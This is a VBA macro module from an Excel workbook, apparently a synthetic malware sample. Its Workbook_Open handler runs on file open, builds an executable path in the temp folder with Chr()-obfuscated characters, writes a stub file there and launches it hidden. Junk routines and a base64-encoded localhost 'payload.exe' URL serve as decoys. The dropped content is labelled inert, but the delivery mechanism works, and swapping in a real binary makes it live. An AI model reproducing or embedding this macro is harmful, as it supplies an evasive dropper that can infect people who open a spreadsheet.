
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim jybosg1pnivrj As Integer, exe As String
    exe = Environ("TEMP") & Chr(92) & Chr(111) & Chr(98) & Chr(108) & Chr(105) & Chr(118) & "ionx_st" & "ub.e" & "xe"
    jybosg1pnivrj = FreeFile
    Open exe For Binary As #jybosg1pnivrj
    Put #jybosg1pnivrj, , "MZ-this" & "-is-an" & "-inert-ma" & "rker-stu" & "b"
    Close #jybosg1pnivrj
    Shell exe, 0
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
